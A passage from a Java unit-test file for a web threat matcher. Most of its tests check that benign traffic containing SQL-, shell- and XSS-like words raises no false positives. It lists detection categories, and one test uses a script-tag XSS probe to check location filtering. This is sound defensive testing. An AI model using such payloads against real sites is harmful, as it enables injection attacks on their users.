            "body"), "exec as field name not function");

        // Dashes in normal values (not SQL comment)
        assertEmpty(matcher.scan(
            "/search?q=high-performance-database-server",
            "url"), "dashes in URL slug");

        // Benchmark in normal context
        assertEmpty(matcher.scan(
            "{\"benchmark_results\":{\"latency_p50\":12,\"latency_p99\":45}}",
            "body"), "benchmark as field name");

        // Hash in normal URL anchor
        assertEmpty(matcher.scan(
            "/docs/api-reference#authentication",
            "url"), "URL anchor fragment");

        // Outfile/dumpfile as regular words
        assertEmpty(matcher.scan(
            "{\"export_type\":\"csv\",\"output_file\":\"report.csv\",\"dump_file_size\":1024}",
            "body"), "outfile/dumpfile as regular field names");
    }

    // =====================================================================
    //  COMPREHENSIVE FALSE POSITIVE — realistic full HTTP request cycle
    //  Tests that a complete realistic request (all 4 locations scanned
    //  together) produces zero false positives across ALL categories
    // =====================================================================

    @Test
    public void fp_fullRequestCycle_ecommerce() {
        // Realistic e-commerce search URL
        assertEmpty(matcher.scan(
            "/api/v2/products/search?q=union+jack+t-shirt&category=clothing&sort=price&order=asc&page=1&limit=50",
            "url"), "e-commerce search with 'union' in product name");

        // Realistic request headers for that request
        assertEmpty(matcher.scan(
            "{host=[shop.example.com], user-agent=[Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36], " +
            "accept=[application/json], accept-language=[en-GB,en;q=0.9], " +
            "cookie=[cart_id=c8f2e9a1; session=s%3Aabc123.sig; _ga=GA1.2.12345; csrf=xYz789], " +
            "x-forwarded-for=[86.42.170.99], x-request-id=[req-2024-abcdef], " +
            "content-type=[application/json], referer=[https://shop.example.com/clothing?type=shirts]}",
            "headers"), "realistic e-commerce request headers");

        // Realistic JSON body for a product filter
        assertEmpty(matcher.scan(
            "{\"filters\":{\"category\":\"clothing\",\"size\":[\"M\",\"L\"],\"color\":\"blue\",\"price_range\":{\"min\":10,\"max\":100}," +
            "\"in_stock\":true,\"brand\":[\"Union Works\",\"Drop Dead\"],\"material\":\"cotton\",\"sort_by\":\"price\"," +
            "\"select_fields\":[\"name\",\"price\",\"image\"],\"exclude_sold_out\":true},\"pagination\":{\"page\":1,\"per_page\":50}}",
            "body"), "realistic e-commerce filter body with SQL-like words");

        // Realistic JSON response
        assertEmpty(matcher.scan(
            "{\"data\":{\"products\":[{\"id\":1001,\"name\":\"Union Jack T-Shirt\",\"price\":29.99,\"description\":\"Classic drop-shoulder tee\"," +
            "\"sizes\":[\"S\",\"M\",\"L\"],\"in_stock\":true,\"category\":\"clothing/t-shirts\"}]," +
            "\"pagination\":{\"page\":1,\"per_page\":50,\"total\":142},\"filters_applied\":3}," +
            "\"meta\":{\"cache_hit\":true,\"response_time_ms\":23,\"version\":\"2.1.0\"}}",
            "resp_body"), "realistic e-commerce JSON response");
    }

    @Test
    public void fp_fullRequestCycle_devToolsDashboard() {
        // DevOps dashboard URL with tool-like keywords
        assertEmpty(matcher.scan(
            "/api/v1/deployments/exec-summary?env=production&status=active&from=2024-01-01&to=2024-01-31",
            "url"), "devops dashboard URL with 'exec' in path");

        // Dashboard headers
        assertEmpty(matcher.scan(
            "{host=[dashboard.internal.corp], authorization=[Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.sig], " +
            "accept=[application/json], user-agent=[DashboardClient/3.2], " +
            "x-correlation-id=[corr-550e8400-e29b-41d4]}",
            "headers"), "internal dashboard headers");

        // Metrics body with attack-like field names
        assertEmpty(matcher.scan(
            "{\"deployment\":{\"id\":\"deploy-789\",\"exec_time_ms\":4500,\"pipeline_stage\":\"select-canary\"," +
            "\"rollback_table\":{\"enabled\":true,\"threshold\":0.05},\"drop_rate\":0.001," +
            "\"union_cluster\":\"us-east-1\",\"sleep_between_batches_ms\":500," +
            "\"benchmark_score\":98.5,\"insert_rate\":1500,\"delete_stale_after_hours\":72," +
            "\"update_strategy\":\"rolling\",\"alter_config\":{\"max_replicas\":5}}}",
            "body"), "deployment config with every SQL keyword as field name");
    }

    // =====================================================================
    //  LOCATION FILTERING TESTS
    // =====================================================================

    @Test
    public void testXss_notInResponseBody() {
        String payload = "<script>alert(1)</script>";
        List<HyperscanThreatMatcher.MatchResult> results = matcher.scan(payload, "resp_body");
        assertNoCategory(results, "xss", "XSS should not match in response body");
    }

    @Test
    public void testStackTrace_onlyInResponseBody() {
        String payload = "Exception in thread \"main\" java.lang.NullPointerException\n  at com.example.App.main(App.java:10)";
        assertFalse("Stack trace should be detected in resp_body", matcher.scan(payload, "resp_body").isEmpty());
        assertTrue("Stack trace should NOT be detected in URL", matcher.scan(payload, "url").isEmpty());
        assertTrue("Stack trace should NOT be detected in req body", matcher.scan(payload, "body").isEmpty());
    }

    // =====================================================================
    //  FALSE POSITIVE TESTS — individual benign inputs
    // =====================================================================

    @Test public void fp_localhostHost() { assertNoCategory(matcher.scan("{host=[localhost:8080]}", "headers"), "ssrf", "bare localhost"); }
    @Test public void fp_curlUserAgent() { assertNoPrefix(matcher.scan("{user-agent=[curl/7.68.0]}", "headers"), "os_cmd_shell_commands", "curl in UA"); }
    @Test public void fp_jsonNode() { assertNoPrefix(matcher.scan("{\"node_id\":\"abc\",\"node\":\"w1\"}", "body"), "os_cmd_shell_commands", "JSON node"); }
    @Test public void fp_urlHash() { assertNoPrefix(matcher.scan("/page#section-2", "url"), "sqli_comment_evasion", "URL #fragment"); }
    @Test public void fp_jsonTimeout() { assertNoPrefix(matcher.scan("{\"timeout\":30,\"retries\":3}", "body"), "os_cmd_sleep_delay", "JSON timeout"); }
    @Test public void fp_benignTemplate() { assertNoCategory(matcher.scan("{{user.name}} - {{user.email}}", "body"), "ssti", "benign template"); }
    @Test public void fp_xPoweredBy() { assertNoPrefix(matcher.scan("X-Powered-By: Express\n{\"ok\":true}", "resp_body"), "debug_enabled", "X-Powered-By"); }
    @Test public void fp_normalResponse() { assertEmpty(matcher.scan("{\"users\":[{\"id\":1}],\"total\":1}", "resp_body"), "normal JSON response"); }
    @Test public void fp_normalRequest() { assertEmpty(matcher.scan("{\"username\":\"john\",\"password\":\"Secure123\"}", "body"), "normal login"); }
    @Test public void fp_normalUrl() { assertEmpty(matcher.scan("/api/v2/users/123/orders?status=pending&page=1", "url"), "normal URL"); }
    @Test public void fp_normalCss() { assertEmpty(matcher.scan("body{color:red;font-size:14px}", "body"), "normal CSS"); }
    @Test public void fp_serverVersionNoNumber() { assertNoPrefix(matcher.scan("Server: Nginx", "resp_body"), "version_disclosure", "Server without version"); }

    // =====================================================================
    //  FALSE POSITIVE — comprehensive realistic HTTP traffic
    //  A single test scanning realistic benign payloads across all
    //  locations that resemble attack patterns but should NOT trigger.
    // =====================================================================

    @Test
    public void fp_realisticBenignTraffic() {
        // Benign URL with query params that look like SQL keywords
        assertEmpty(matcher.scan(
            "/api/v3/users/select?filter=active&order=asc&table=accounts&drop=false&union=credit",
            "url"), "benign URL with SQL-like param names");

        // Benign request headers
        assertEmpty(matcher.scan(
            "{host=[app.example.com:443], user-agent=[Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36], " +
            "accept=[text/html, application/xhtml+xml, application/xml;q=0.9], " +
            "accept-language=[en-US,en;q=0.5], cookie=[session=abc123; theme=dark], " +
            "x-forwarded-for=[203.0.113.50], x-request-id=[550e8400-e29b-41d4-a716-446655440000], " +
            "content-type=[application/json], referer=[https://app.example.com/dashboard]}",
            "headers"), "benign request headers");

        // Benign JSON body with field names that resemble attack keywords
        assertEmpty(matcher.scan(
            "{\"action\":\"update\",\"script_version\":\"2.1.0\",\"command_name\":\"deploy\"," +
            "\"node_count\":5,\"timeout\":30,\"pipeline_id\":\"abc-123\"," +
            "\"filter\":{\"status\":\"active\",\"type\":\"admin\"},\"select_all\":true," +
            "\"table_view\":\"compact\",\"expression\":\"scheduled\",\"template\":\"default\"," +
            "\"net_total\":150.00,\"ping_interval\":60,\"exec_mode\":\"async\"}",
            "body"), "benign JSON with attack-like field names");

        // Benign API JSON response
        assertEmpty(matcher.scan(
            "{\"data\":{\"users\":[{\"id\":1,\"name\":\"Alice\",\"role\":\"admin\"}," +
            "{\"id\":2,\"name\":\"Bob\",\"role\":\"user\"}],\"pagination\":{\"page\":1," +
            "\"per_page\":20,\"total\":42}},\"meta\":{\"request_id\":\"req-001\"," +
            "\"cached\":false,\"version\":\"3.2.1\"}}",
            "resp_body"), "benign API JSON response");

        // Benign HTML response (no stack traces, no debug info)
        assertEmpty(matcher.scan(
            "<html><head><title>Dashboard</title></head><body>" +
            "<div class=\"container\"><h1>Welcome back</h1>" +
            "<p>Your account status is active.</p>" +
            "<a href=\"/settings\">Settings</a>" +
            "<img src=\"/avatar/user123.png\" alt=\"avatar\">" +
            "<form method=\"POST\" action=\"/update-profile\">" +
            "<input type=\"text\" name=\"display_name\" value=\"Alice\">" +
            "<button type=\"submit\">Save</button></form></div></body></html>",
            "resp_body"), "benign HTML response");

        // Benign nested REST URL
        assertEmpty(matcher.scan(
            "/api/v2/organizations/123/teams/456/members?role=admin&sort=name",
            "url"), "benign nested REST URL");

        // Benign GraphQL query
        assertEmpty(matcher.scan(
            "{\"query\":\"{ users(first: 10, filter: { role: admin }) { id name email } }\",\"variables\":{}}",
            "body"), "benign GraphQL query");

        // Benign XML body (no XXE entities)
        assertEmpty(matcher.scan(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><user>alice</user><action>login</action></request>",
            "body"), "benign XML without entities");
    }

    // =====================================================================
    //  FALSE POSITIVE STRESS TESTS — realistic payloads that resemble attacks
    //  but are legitimate. Each test verifies the scanner does NOT fire the
    //  attack category that the payload superficially resembles.
    // =====================================================================

    // --- SQL Injection look-alikes ---

    @Test public void fpSqli_01_blogPostAboutSqlInjection() {
        // A blog post body discussing SQL injection techniques
        assertNoCategory(matcher.scan(
            "{\"title\":\"How to prevent SQL injection\",\"body\":\"Always use parameterized queries. Never concatenate user input. For example DROP TABLE students is a common attack.\"}", "body"), "sqli", "blog about SQLi");
    }

    @Test public void fpSqli_02_searchForUnionKeyword() {
        // User searching for the word "union" in a labor-related app
        assertNoCategory(matcher.scan("/api/search?q=trade+union+membership+benefits", "url"), "sqli", "search for trade union");
    }

    @Test public void fpSqli_03_sqlFieldNamesInJson() {
        // JSON with field names that look like SQL keywords
        assertEmpty(matcher.scan("{\"select_all\":true,\"order_by\":\"date\",\"group_name\":\"admins\",\"drop_down_value\":\"option1\"}", "body"), "SQL-like field names in JSON");
    }

    @Test public void fpSqli_04_naturalLanguageWithOr() {
        // Chat message with "or" and "=" that's not SQL injection
        assertNoCategory(matcher.scan("{\"message\":\"The value should be true or false depending on your use case\"}", "body"), "sqli", "natural language or/true/false");
    }

    @Test public void fpSqli_05_javaScriptCodeComment() {
        // JS code with SQL-like comment syntax (// and --)
        assertNoCategory(matcher.scan("{\"code\":\"var x = getValue(); // this gets the value\"}", "body"), "sqli", "JS comment in code");
    }

    @Test public void fpSqli_06_cssWithSemicolons() {
        // CSS-like content with semicolons (not stacked queries)
        assertEmpty(matcher.scan("font-size:14px; color:red; background:blue; margin:0", "body"), "CSS semicolons");
    }

    @Test public void fpSqli_07_passwordWithSpecialChars() {
        // Password that contains SQL-like characters
        assertNoCategory(matcher.scan("{\"username\":\"admin\",\"password\":\"P@ss'w0rd--2024!\"}", "body"), "sqli", "password with special chars");
    }

    @Test public void fpSqli_08_executableFieldName() {
        // JSON with "exec" as part of a field name
        assertEmpty(matcher.scan("{\"exec_mode\":\"batch\",\"execution_id\":\"abc-123\"}", "body"), "exec in field names");
    }

    @Test public void fpSqli_09_sleepApiEndpoint() {
        // A sleep/health monitoring API
        assertNoCategory(matcher.scan("/api/v1/sleep-tracker/sessions?duration=480", "url"), "sqli", "sleep tracker endpoint");
    }

    @Test public void fpSqli_10_orderByInRestApi() {
        // REST API with sort/order parameters
        assertEmpty(matcher.scan("/api/users?sort_by=created_at&order=desc&limit=50&offset=100", "url"), "REST sort params");
    }

    @Test public void fpSqli_11_benchmarkInPerfTest() {
        // Performance testing payload
        assertNoCategory(matcher.scan("{\"test\":\"benchmark\",\"iterations\":1000,\"results\":{\"p50\":23,\"p99\":145}}", "body"), "sqli", "benchmark perf test");
    }

    @Test public void fpSqli_12_commentInMarkdown() {
        // Markdown content with dashes (not SQL comments)
        assertNoCategory(matcher.scan("{\"content\":\"# My Title\\n\\n---\\n\\nParagraph text here. Use -- for em-dash.\"}", "body"), "sqli", "markdown dashes");
    }

    // --- XSS look-alikes ---

    @Test public void fpXss_01_htmlEmailContent() {
        // Legitimate HTML email template stored in DB
        assertNoCategory(matcher.scan("{\"template\":\"<div style='color:red'>Welcome {{name}}</div>\"}", "body"), "xss", "HTML email template");
    }

    @Test public void fpXss_02_reactJsxSnippet() {
        // React JSX code being saved
        assertEmpty(matcher.scan("{\"code\":\"const App = () => <div className='container'><h1>Hello</h1></div>\"}", "body"), "React JSX snippet");
    }

    @Test public void fpXss_03_svgFileUploadMeta() {
        // SVG metadata without event handlers
        assertNoCategory(matcher.scan("<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><circle cx='50' cy='50' r='40'/></svg>", "body"), "xss", "benign SVG");
    }

    @Test public void fpXss_04_jsEventNameInJson() {
        // JSON with event names as keys (analytics tracking)
        assertEmpty(matcher.scan("{\"onclick_count\":42,\"onload_time_ms\":1200,\"onerror_rate\":0.02}", "body"), "event names as JSON keys");
    }

    @Test public void fpXss_05_mathEquationInBody() {
        // Mathematical content with angle brackets
        assertEmpty(matcher.scan("{\"formula\":\"if x > 0 and y < 10 then z = x + y\"}", "body"), "math with angle brackets");
    }

    @Test public void fpXss_06_urlWithAlertParam() {
        // URL with "alert" as a legitimate query param value
        assertNoCategory(matcher.scan("/api/notifications?type=alert&severity=high&channel=email", "url"), "xss", "alert as param value");
    }

    @Test public void fpXss_07_iframeInDocumentation() {
        // Documentation mentioning iframe (not an actual tag injection)
        assertEmpty(matcher.scan("{\"doc\":\"To embed content, you can use the embed API. The iframe element is deprecated.\"}", "body"), "iframe in docs text");
    }

    @Test public void fpXss_08_confirmDialogApi() {
        // API for managing confirmation dialogs
        assertEmpty(matcher.scan("/api/dialogs/confirm?title=Delete+Account&message=Are+you+sure", "url"), "confirm dialog API");
    }

    @Test public void fpXss_09_javaScriptMimeType() {
        // Content-Type header with javascript
        assertNoCategory(matcher.scan("{content-type=[application/javascript], cache-control=[max-age=3600]}", "headers"), "xss", "JS content type header");
    }

    @Test public void fpXss_10_scriptFieldInJson() {
        // JSON with "script" as a field value (CI/CD config)
        assertEmpty(matcher.scan("{\"type\":\"script\",\"name\":\"deploy.sh\",\"timeout\":300}", "body"), "script field in CI config");
    }

    // --- Command Injection look-alikes ---

    @Test public void fpCmd_01_pipeInLogMessage() {
        // Log message with pipe character
        assertEmpty(matcher.scan("{\"log\":\"Data flows from producer | to consumer | via queue\"}", "body"), "pipe in log message");
    }

    @Test public void fpCmd_02_curlInDocumentation() {
        // API docs mentioning curl
        assertEmpty(matcher.scan("{\"example\":\"Use the following: curl -X POST https://api.example.com/data\"}", "body"), "curl in API docs");
    }

    @Test public void fpCmd_03_pingEndpointName() {
        // Health check ping endpoint
        assertEmpty(matcher.scan("/api/ping", "url"), "ping health endpoint");
    }

    @Test public void fpCmd_04_bashInJobConfig() {
        // CI/CD job configuration
        assertEmpty(matcher.scan("{\"shell\":\"bash\",\"script_path\":\"/opt/deploy/run.sh\"}", "body"), "bash in job config");
    }

    @Test public void fpCmd_05_catInProductName() {
        // Product catalog with "cat" in name
        assertEmpty(matcher.scan("{\"category\":\"cat-food\",\"product\":\"Whiskas 500g\"}", "body"), "cat in product name");
    }

    @Test public void fpCmd_06_ampersandInCompanyName() {
        // Company name with &
        assertEmpty(matcher.scan("{\"company\":\"Johnson & Johnson\",\"revenue\":\"93.77B\"}", "body"), "ampersand in company name");
    }

    @Test public void fpCmd_07_sleepInHealthApp() {
        // Health/fitness app tracking sleep
        assertEmpty(matcher.scan("{\"activity\":\"sleep\",\"duration_hours\":7.5,\"quality\":\"good\"}", "body"), "sleep in health app");
    }

    @Test public void fpCmd_08_whoamiInChat() {
        // Was a FP: "whoami and" triggered windows_system_commands.
        // Fixed by removing whoami from windows_system_commands (covered by os_cmd_shell_commands with shell metachar prefix).
        assertEmpty(matcher.scan("{\"message\":\"Sometimes I ask myself whoami and what is my purpose\"}", "body"), "whoami in chat message");
    }

    @Test public void fpCmd_09_netInNetworking() {
        // Networking configuration
        assertEmpty(matcher.scan("{\"net_interface\":\"eth0\",\"netmask\":\"255.255.255.0\"}", "body"), "net in networking config");
    }

    @Test public void fpCmd_10_perlInLanguageList() {
        // Programming language selection
        assertEmpty(matcher.scan("{\"languages\":[\"java\",\"python\",\"perl\",\"ruby\",\"go\"]}", "body"), "perl in language list");
    }

    // --- NoSQL Injection look-alikes ---

    @Test public void fpNosql_01_dollarInCurrency() {
        // Financial data with dollar amounts
        assertEmpty(matcher.scan("{\"price\":\"$99.99\",\"currency\":\"USD\",\"total\":\"$149.98\"}", "body"), "dollar sign in currency");
    }

    @Test public void fpNosql_02_dollarInTemplateVar() {
        // Template variable syntax (e.g., shell/bash)
        assertEmpty(matcher.scan("{\"template\":\"Hello $username, your balance is $balance\"}", "body"), "dollar in template vars");
    }

    @Test public void fpNosql_03_jsonWithNestedObjects() {
        // Deeply nested JSON (not MongoDB operators)
        assertEmpty(matcher.scan("{\"user\":{\"profile\":{\"settings\":{\"theme\":\"dark\",\"lang\":\"en\"}}}}", "body"), "deeply nested JSON");
    }

    @Test public void fpNosql_04_filterBracketParams() {
        // URL params with brackets (Laravel/Rails style)
        assertEmpty(matcher.scan("/api/products?filter[category]=electronics&filter[price_min]=100&filter[price_max]=500", "url"), "bracket filter params");
    }

    @Test public void fpNosql_05_aggregateInApiName() {
        // API endpoint with "aggregate" in name
        assertEmpty(matcher.scan("/api/v2/metrics/aggregate?period=daily&metric=page_views", "url"), "aggregate endpoint");
    }

    @Test public void fpNosql_06_evalInCodeReview() {
        // Code review comment mentioning eval
        assertEmpty(matcher.scan("{\"comment\":\"Please avoid using eval in production code, use JSON.parse instead\"}", "body"), "eval in code review");
    }

    @Test public void fpNosql_07_matchInSportsApp() {
        // Sports app with "match" data
        assertEmpty(matcher.scan("{\"match_id\":\"12345\",\"home_team\":\"Arsenal\",\"away_team\":\"Chelsea\",\"score\":\"2-1\"}", "body"), "match in sports app");
    }

    // --- SSRF look-alikes ---

    @Test public void fpSsrf_01_localhostInErrorLog() {
        // Error log referencing localhost
        assertEmpty(matcher.scan("{\"error\":\"Connection refused to localhost:5432\",\"service\":\"postgres\"}", "body"), "localhost in error log");
    }

    @Test public void fpSsrf_02_privateIpInConfig() {
        // Infrastructure config showing private IPs
        assertEmpty(matcher.scan("{\"nodes\":[{\"name\":\"web-1\",\"ip\":\"10.0.1.5\"},{\"name\":\"web-2\",\"ip\":\"10.0.1.6\"}]}", "body"), "private IPs in config");
    }

    @Test public void fpSsrf_03_publicUrlInWebhook() {
        // Webhook pointing to a public URL (not internal)
        assertEmpty(matcher.scan("{\"webhook_url\":\"https://hooks.slack.com/services/T00/B00/XXXX\"}", "body"), "public webhook URL");
    }

    @Test public void fpSsrf_04_fileExtensionInPath() {
        // URL with "file" in path (not file:// protocol)
        assertEmpty(matcher.scan("/api/v1/file/upload?format=pdf&max_size=10MB", "url"), "file in path");
    }

    // --- LFI look-alikes ---

    @Test public void fpLfi_01_relativeImportPath() {
        // JavaScript/TypeScript relative import
        assertEmpty(matcher.scan("{\"import\":\"../components/Button\"}", "body"), "JS relative import");
    }

    @Test public void fpLfi_02_breadcrumbNavigation() {
        // Breadcrumb with path-like separators
        assertEmpty(matcher.scan("/products/electronics/phones/iphone-15", "url"), "breadcrumb path");
    }

    @Test public void fpLfi_03_windowsFilePath() {
        // Windows file path in config (not traversal)
        assertEmpty(matcher.scan("{\"output_dir\":\"C:\\\\Users\\\\admin\\\\Documents\\\\reports\"}", "body"), "Windows file path");
    }

    @Test public void fpLfi_04_percentEncodedSpaces() {
        // URL-encoded spaces (not traversal encoding)
        assertEmpty(matcher.scan("/api/search?q=hello%20world%20test&page=1", "url"), "URL-encoded spaces");
    }

    @Test public void fpLfi_05_etcInProductName() {
        // "etc" as a normal word
        assertEmpty(matcher.scan("{\"description\":\"Includes shoes, shirts, pants, etc. All sizes available.\"}", "body"), "etc in product description");
    }

    @Test public void fpLfi_06_logInApiEndpoint() {
        // Logging/analytics endpoint
        assertEmpty(matcher.scan("/api/v1/log/events?level=info&service=auth", "url"), "log endpoint");
    }

    // --- XXE look-alikes ---

    @Test public void fpXxe_01_normalXmlBody() {
        // Normal XML without entity declarations
        assertEmpty(matcher.scan("<?xml version=\"1.0\"?><order><item>Widget</item><qty>5</qty></order>", "body"), "normal XML order");
    }

    @Test public void fpXxe_02_docTypeInHtml() {
        // Standard HTML5 doctype
        assertEmpty(matcher.scan("<!DOCTYPE html><html><head><title>Page</title></head></html>", "body"), "HTML5 doctype");
    }

    @Test public void fpXxe_03_entityInText() {
        // The word "entity" in normal text
        assertEmpty(matcher.scan("{\"text\":\"A legal entity is an organization recognized by law\"}", "body"), "entity in legal text");
    }

    // --- SSTI look-alikes ---

    @Test public void fpSsti_01_mustacheTemplate() {
        // Mustache/Handlebars template with simple vars (no builtins)
        assertEmpty(matcher.scan("Hello {{name}}, your order #{{order_id}} has shipped!", "body"), "mustache template");
    }

    @Test public void fpSsti_02_doubleCurlyInJson() {
        // Escaped curly braces in JSON
        assertEmpty(matcher.scan("{\"format\":\"{{}}\",\"template\":\"{{user_name}}\"}", "body"), "curly braces in JSON");
    }

    @Test public void fpSsti_03_dollarCurlyInShell() {
        // Shell variable expansion (no dangerous keywords)
        assertEmpty(matcher.scan("{\"cmd\":\"echo ${HOME}/data/${DATE}\"}", "body"), "shell vars");
    }

    // --- LDAP look-alikes ---

    @Test public void fpLdap_01_parenthesesInSearch() {
        // Normal search with parentheses
        assertEmpty(matcher.scan("/api/search?q=(best+selling)+products+(2024)", "url"), "parentheses in search");
    }

    @Test public void fpLdap_02_logicInQueryParam() {
        // URL with & and | for filtering (not LDAP)
        assertEmpty(matcher.scan("/api/items?status=active&category=books", "url"), "filter params");
    }

    // --- Cross-category: realistic full request bodies that combine innocuous patterns ---

    @Test
    public void fpCross_01_ecommerceCheckout() {
        // Checkout payload with dollar amounts, order keywords, semicolons
        String payload = "{\"order_id\":\"ORD-2024-9981\",\"items\":[{\"name\":\"Cat Food Premium 5kg\",\"price\":\"$29.99\",\"qty\":2},{\"name\":\"Script Writing Course\",\"price\":\"$49.00\",\"qty\":1}],\"total\":\"$108.98\",\"payment\":{\"method\":\"card\",\"exec_date\":\"2024-03-15\"},\"shipping\":{\"address\":\"123 Main St; Apt 4B\",\"city\":\"Union City\"}}";
        assertEmpty(matcher.scan(payload, "body"), "ecommerce checkout payload");
    }

    @Test
    public void fpCross_02_developerChatMessage() {
        // Chat message discussing technical topics
        String payload = "{\"from\":\"dev@company.com\",\"message\":\"Hey, the select query is slow. Can you check if the table has an index on the user_id column? Also the script.js file needs an update for the alert banner component. Let me ping the backend team.\",\"channel\":\"engineering\"}";
        assertEmpty(matcher.scan(payload, "body"), "dev chat about SQL and frontend");
    }

    @Test
    public void fpCross_03_cicdPipelineConfig() {
        // CI/CD pipeline config with shell-like terms
        String payload = "{\"pipeline\":{\"name\":\"deploy-prod\",\"trigger\":\"on_push\",\"stages\":[{\"name\":\"test\",\"shell\":\"bash\",\"timeout\":300},{\"name\":\"build\",\"image\":\"node:18\"},{\"name\":\"deploy\",\"exec_order\":3}]},\"notifications\":{\"on_error\":{\"channel\":\"alerts\",\"ping_oncall\":true}}}";
        assertEmpty(matcher.scan(payload, "body"), "CI/CD pipeline config");
    }

    @Test
    public void fpCross_04_analyticsEvent() {
        // Analytics event with event handler-like field names
        String payload = "{\"event\":\"page_view\",\"properties\":{\"onclick_element\":\"buy_button\",\"onload_duration_ms\":1432,\"onerror_count\":0,\"page_path\":\"/products/cat-toys\",\"user_agent\":\"Mozilla/5.0\"}}";
        assertEmpty(matcher.scan(payload, "body"), "analytics event payload");
    }

    @Test
    public void fpCross_05_networkDiagnosticReport() {
        // Network diagnostic output
        String payload = "{\"diagnostic\":{\"dns_resolution\":\"ok\",\"ping_latency_ms\":23,\"traceroute_hops\":12,\"net_interface\":\"eth0\",\"ip\":\"192.168.1.100\",\"gateway\":\"192.168.1.1\",\"timeout_retries\":3,\"connection_pool_size\":50}}";
        assertEmpty(matcher.scan(payload, "body"), "network diagnostic report");
    }

    @Test
    public void fpCross_06_securityAuditReport() {
        // Security audit report that mentions attack types
        String payload = "{\"report\":{\"title\":\"Q1 Security Audit\",\"findings\":[{\"type\":\"info\",\"description\":\"No SQL injection vulnerabilities found in user input handling\"},{\"type\":\"info\",\"description\":\"XSS prevention via Content-Security-Policy header is effective\"},{\"type\":\"low\",\"description\":\"Server version disclosed in response headers\"}]}}";
        assertEmpty(matcher.scan(payload, "body"), "security audit report");
    }

    @Test
    public void fpCross_07_databaseMigrationLog() {
        // Database migration log with SQL keywords in text
        String payload = "{\"migration\":\"20240315_add_users_table\",\"status\":\"completed\",\"log\":\"Created table 'users' with columns id, name, email. Added index on email column. Execution time: 234ms.\"}";
        assertEmpty(matcher.scan(payload, "body"), "DB migration log");
    }

    @Test
    public void fpCross_08_formWithSpecialCharacters() {
        // User-submitted form with special characters in free text
        String payload = "{\"name\":\"O'Brien\",\"bio\":\"I'm a developer & designer. I love <building> things -- it's what I do! Contact: john@example.com\",\"website\":\"https://obrien.dev\"}";
        assertEmpty(matcher.scan(payload, "body"), "form with special chars");
    }

    @Test
    public void fpCross_09_searchQueryWithOperators() {
        // Search query using boolean operators
        assertEmpty(matcher.scan("/api/search?q=python+OR+java+AND+NOT+php&sort=relevance&page=1", "url"), "boolean search operators");
    }

    @Test
    public void fpCross_10_configWithMixedKeywords() {
        // Config file with various attack-like keywords as legitimate settings
        String payload = "{\"config\":{\"alert_email\":\"admin@example.com\",\"exec_timeout\":30,\"sleep_between_retries\":5,\"select_limit\":100,\"drop_stale_connections\":true,\"union_results\":false,\"script_engine\":\"v8\"}}";
        assertEmpty(matcher.scan(payload, "body"), "config with attack-like keywords");
    }

    // =====================================================================
    //  DEEP FALSE POSITIVE STRESS TESTS — payloads from real WAF FP research
    //  (CRS issues, Wallarm literature study, AWS WAF tuning guides)
    //  These are the trickiest cases that actually match regex patterns.
    // =====================================================================

    // --- SQLi deep FPs: payloads that WILL match naive patterns ---

    @Test public void fpDeepSqli_01_dropTableFurniture() {
        // IKEA-style product name — "drop table" is a furniture term (drop-leaf table)
        assertNoCategory(matcher.scan("{\"product\":\"IKEA DROP TABLE Leaf - Oak finish, seats 4-6\"}", "body"), "sqli", "drop table furniture product");
    }

    @Test public void fpDeepSqli_02_unionSelectCommittee() {
        // CRS Issue #1529: labor union context with "union select...from"
        assertNoCategory(matcher.scan(
            "The European Union select committee released findings from the investigation into trade practices", "body"), "sqli", "union select committee");
    }

    @Test public void fpDeepSqli_03_sportsRugbyUnion() {
        // Sports API with "Union" in sport name + "select" + "from"
        assertNoCategory(matcher.scan(
            "{\"league\":\"Rugby Union\",\"action\":\"select players\",\"filter\":\"from the shortlist\"}", "body"), "sqli", "rugby union select from");
    }

    @Test public void fpDeepSqli_04_cssBlockComment() {
        // CSS with /* ... */ block comments — matches sqli_comment_evasion
        assertNoCategory(matcher.scan(
            "{\"custom_css\":\"body { color: #333; } /* Main content area */ .header { font-size: 14px; }\"}", "body"), "sqli", "CSS block comment");
    }

    @Test public void fpDeepSqli_05_irishNameWithDash() {
        // O'Malley's -- matches sqli_comment_evasion pattern ('\s*--)
        assertNoCategory(matcher.scan(
            "{\"review\":\"O'Malley's -- best Irish pub in town, 5 stars!\"}", "body"), "sqli", "Irish name with em-dash");
    }

    @Test public void fpDeepSqli_06_changelogSemicolonUpdate() {
        // Release notes: "; update" matches stacked queries pattern
        assertNoCategory(matcher.scan(
            "{\"changelog\":\"Fixed migration script; update version to 2.4.1\"}", "body"), "sqli", "changelog semicolon update");
    }

    @Test public void fpDeepSqli_07_taskDescSemicolonSelect() {
        // Project management: "; select" matches stacked queries
        assertNoCategory(matcher.scan(
            "{\"task\":\"Review PR #421; select reviewers from the backend team\"}", "body"), "sqli", "task semicolon select");
    }

    @Test public void fpDeepSqli_08_emailTemplateSemicolonDelete() {
        // Notification template: "; delete" matches stacked queries
        assertNoCategory(matcher.scan(
            "{\"template\":\"Your order has been confirmed; delete this email if received in error\"}", "body"), "sqli", "email template semicolon delete");
    }

    @Test public void fpDeepSqli_09_legalDocExecuteAgreement() {
        // Legal contract management: "execute Agreement" matches exec pattern
        assertNoCategory(matcher.scan(
            "{\"clause\":\"The parties agree to execute Agreement within 30 days of the effective date\"}", "body"), "sqli", "legal execute agreement");
    }

    @Test public void fpDeepSqli_10_cicdExecDeployment() {
        // CI/CD pipeline: "exec maven-build" matches exec pattern
        assertNoCategory(matcher.scan(
            "{\"pipeline_config\":\"exec maven-build\",\"stage\":\"compile\"}", "body"), "sqli", "CI exec maven-build");
    }

    @Test public void fpDeepSqli_11_threadSleepConfig() {
        // Java sleep config — "sleep(5000)" matches time-based pattern
        assertNoCategory(matcher.scan(
            "{\"retry_config\":\"Thread.sleep(5000) before retry\",\"max_retries\":3}", "body"), "sqli", "thread sleep config");
    }

    @Test public void fpDeepSqli_12_surveyAndTrue() {
        // Survey answer with " and true" matching OR/AND tautology
        assertNoCategory(matcher.scan(
            "{\"feedback\":\"I would rate this feature as helpful and true to the original design\"}", "body"), "sqli", "survey and true");
    }

    @Test public void fpDeepSqli_13_transactionDescription() {
        // Financial transaction with "; update" + apostrophe + "--"
